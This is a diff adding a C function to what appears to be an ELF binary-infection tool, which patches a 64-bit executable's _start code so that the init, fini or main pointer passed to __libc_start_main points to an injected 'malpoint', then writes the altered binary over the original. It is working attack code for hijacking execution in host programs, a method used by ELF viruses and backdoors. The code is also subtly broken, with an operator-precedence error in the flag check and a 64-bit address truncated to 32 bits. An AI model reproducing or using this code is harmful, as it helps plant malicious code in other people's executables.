@@ -312,3 +312,62 @@ int libc_start_main_hijack_32(Elfit_t *host, uint32_t malpoint, int mode)
     
     return 1; 
 }
+
+int libc_start_main_hijack_64(Elfit_t *host, uint64_t malpoint, int mode)
+{
+    Elf64_Ehdr *ehdr; 
+    Elf64_Phdr *phdr;
+    Elf64_Addr startaddr; 
+    unsigned char *startoff;
+    off_t offset;
+    int ofd;
+    int i, c;
+
+    ehdr = (Elf64_Ehdr *) host->mem;
+    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);
+
+    startaddr = ehdr->e_entry;
+    
+    /* get offset of _start */
+    for(i = 0; i < ehdr->e_phnum; i++, phdr++) 
+    {
+        if (phdr->p_type == PT_LOAD && phdr->p_flags == PF_R | PF_X)
+        {
+            startoff = host->mem + phdr->p_offset + (startaddr - phdr->p_vaddr);
+            break;
+        }
+    }
+
+    
+    /* start for _start and begin looking for pushes to the stack
+     * the 5th push we see (on 32bit) will be pushing a pointer to a to
+     * __libc_csu_init. This is where we'll insert our malpoint */
+
+    if (mode == HIJACK_INIT)
+        offset = 18;
+    else if (mode == HIJACK_FINI)
+        offset = 25;
+    else if (mode == HIJACK_MAIN)
+        offset = 32;
+
+    *(uint32_t *)&startoff[offset] = malpoint;
+    printf("[+ LIBC ARG HIJACK]\tHijacking __libc_csu_%s pointer with 0x%x\n",
+        mode == HIJACK_INIT ? "init":"fini" , malpoint);
+
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
+        < 0)
+    {
+        perror("tmp binary: open");
+        return -1; 
+    }
+
+    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
+    {
+        perror("tmp binary: write");
+        return -1;
+    }
+
+    rename(TMP, host->name);
+    
+    return 1; 
+}
